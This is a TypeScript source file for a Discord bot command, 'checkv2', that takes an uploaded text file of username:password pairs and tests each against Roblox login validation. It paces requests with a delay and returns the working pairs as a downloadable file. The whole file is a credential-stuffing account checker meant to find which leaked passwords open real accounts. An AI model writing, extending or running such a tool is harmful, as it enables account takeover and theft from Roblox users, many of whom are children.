import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  type ChatInputCommandInteraction,
  MessageFlags,
  EmbedBuilder,
} from 'discord.js';
import axios from 'axios';
import { validatePassword } from '../../lib/roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildProgressEmbed,
  buildBaseEmbed,
} from '../../lib/embed-helpers';
import { logger } from '../../lib/logger';
import type { Command } from './types';

type Credential = { username: string; password: string };

function extractCredentialsFromLine(line: string): Credential | null {
  const usernameMatch = line.match(/username\s*:\s*(\S+)/i);
  const passwordMatch = line.match(/password\s*:\s*(\S+)/i);
  if (usernameMatch && passwordMatch) {
    return { username: usernameMatch[1], password: passwordMatch[1] };
  }
  const parts = line.split(':').map(s => s.trim());
  if (parts.length >= 2) {
    const username = parts[0];
    const password = parts[1];
    if (username && password) {
      return { username, password };
    }
  }
  return null;
}

function parseCredentials(content: string): Credential[] {
  const lines = content.split('\n').map(l => l.trim()).filter(Boolean);
  const result: Credential[] = [];
  let hasKeyValue = lines.some(l => /username\s*:/i.test(l) && /password\s*:/i.test(l));
  if (hasKeyValue) {
    for (const line of lines) {
      const cred = extractCredentialsFromLine(line);
      if (cred) result.push(cred);
    }
    return result;
  }
  const simpleColonLines = lines.filter(l => l.includes(':') && !l.includes('username') && !l.includes('password'));
  if (simpleColonLines.length > 0) {
    for (const line of simpleColonLines) {
      const cred = extractCredentialsFromLine(line);
      if (cred) result.push(cred);
    }
    return result;
  }
  for (let i = 0; i + 2 < lines.length; i += 3) {
    const username = lines[i];
    const password = lines[i + 1];
    if (username && password) {
      result.push({ username, password });
    }
  }
  return result;
}

const data = new SlashCommandBuilder()
  .setName('checkv2')
  .setDescription('Mass check username:password credentials from a .txt file')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addAttachmentOption((opt) =>
    opt.setName('file')
      .setDescription('A .txt file containing credentials (supports multiple formats)')
      .setRequired(true),
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const attachment = interaction.options.getAttachment('file', true);
    if (!attachment.name?.endsWith('.txt') && !attachment.contentType?.includes('text')) {
      const embed = buildErrorEmbed('✧ **Invalid File**\n────\n⭑ Please attach a `.txt` file.');
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    let fileContent: string;
    try {
      const resp = await axios.get<string>(attachment.url, { responseType: 'text', validateStatus: () => true });
      fileContent = resp.data;
    } catch (err: any) {
      logger.error({ err }, 'File download failed in checkv2');
      const embed = buildErrorEmbed('✧ **Download Failed**\n────\n⭑ Could not fetch the file. Please try again.');
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const credentials = parseCredentials(fileContent);
    if (credentials.length === 0) {
      const embed = buildErrorEmbed('✧ **No Credentials Found**\n────\n⭑ No valid username:password pairs found in the file.');
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const total = credentials.length;
    const progressEmbed = buildProgressEmbed(`Scanning ${total} credential(s)...`);
    await interaction.editReply({ embeds: [progressEmbed] });

    let validCount = 0;
    let invalidCount = 0;
    let processed = 0;
    const delayMs = 2000;
    const validLines: string[] = [];

    let updateCounter = 0;

    for (const cred of credentials) {
      processed++;
      const result = await validatePassword(cred.username, cred.password);
      if (result.valid) {
        validCount++;
        validLines.push(`${cred.username}:${cred.password}`);
      } else {
        invalidCount++;
      }

      updateCounter++;
      if (updateCounter % 5 === 0 || processed === total) {
        const statusEmbed = buildProgressEmbed(
          `Scanning... (${processed}/${total}) | ✅ Valid: ${validCount} | ❌ Invalid: ${invalidCount}`
        );
        await interaction.editReply({ embeds: [statusEmbed] });
      }

      if (processed < total) {
        await new Promise(resolve => setTimeout(resolve, delayMs));
      }
    }

    const summaryEmbed = buildSuccessEmbed(
      validCount === 0
        ? `✧ **Results**\n────\n⭑ Checked ${total} credential(s)\n⭑ **Valid:** 0\n⭑ **Invalid:** ${invalidCount}`
        : `✧ **Results**\n────\n⭑ Checked ${total} credential(s)\n⭑ **Valid:** ${validCount}\n⭑ **Invalid:** ${invalidCount}`
    );

    if (validCount === 0) {
      await interaction.followUp({ embeds: [summaryEmbed], flags: MessageFlags.Ephemeral });
      return;
    }

    const validText = validLines.join('\n');
    const buffer = Buffer.from(validText, 'utf-8');

    await interaction.followUp({
      embeds: [summaryEmbed],
      files: [{ attachment: buffer, name: 'valid_credentials.txt' }],
      flags: MessageFlags.Ephemeral,
    });
  } catch (err: any) {
    logger.error({ err }, 'CheckV2 command error');
    await interaction.editReply({
      embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')],
    });
  }
}

export const checkv2Command: Command = { data, execute };